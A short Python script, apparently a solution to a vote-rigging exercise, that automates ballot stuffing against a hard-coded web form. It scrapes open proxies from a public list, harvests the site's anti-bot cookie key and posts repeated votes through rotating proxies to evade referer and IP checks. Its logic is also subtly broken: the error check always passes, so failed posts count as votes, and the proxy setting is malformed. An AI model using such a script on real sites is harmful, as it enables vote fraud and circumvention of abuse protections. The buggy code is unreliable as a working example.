#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
from random import *

datos = {'id': '3', 'holdthedoor': 'Submit+Query'}
URL = "http://158.69.76.135/level1.php"
id = "\n" + str(datos['id']) + "    "
err_1 = "b'Wrong Referer. See you later hacker! [7]'"
err_2 = "b'See you later hacker! [6]'"
page = requests.get(URL)


def get_vote():
    html = BeautifulSoup(page.text, 'html.parser')
    try:
        td = html.find("td", string=id)
        td = str(td.find_next())
        td_1 = ""
        for x in td[5:-5]:
            if ord(x) != 32:
                td_1 += x
        int(td_1)
    except:
        td_1 = "0"
        int(td_1)
    return (td_1)


def get_proxies(url):
    proxies = requests.get(url)
    html = BeautifulSoup(proxies.text, 'html.parser')
    lista = html.find('tbody')
    td = lista.find_all('td')
    ip = []
    for x in range(len(td)):
        if str(td[x])[7] == '.' or str(td[x])[6] == '.':
            ip.append(
                    "https://" +
                    (str(td[x])[4:-5]) +
                    ':' +
                    (str(td[x + 1])[4:-5])
                    )
    return ip


proxies = get_proxies('https://free-proxy-list.net/')

min = int(get_vote())
while min < 40:
    x = sample(proxies, 1)
    page = requests.get(URL)
    datos['key'] = page.cookies['HoldTheDoor']
    r = requests.post(
            URL,
            data=datos,
            cookies=page.cookies,
            proxies={"https": x}
            )
    if str(r.content) != err_1 or str(r.content) != err_2:
        min += 1
        print(min)
    else:
        print(r.content)
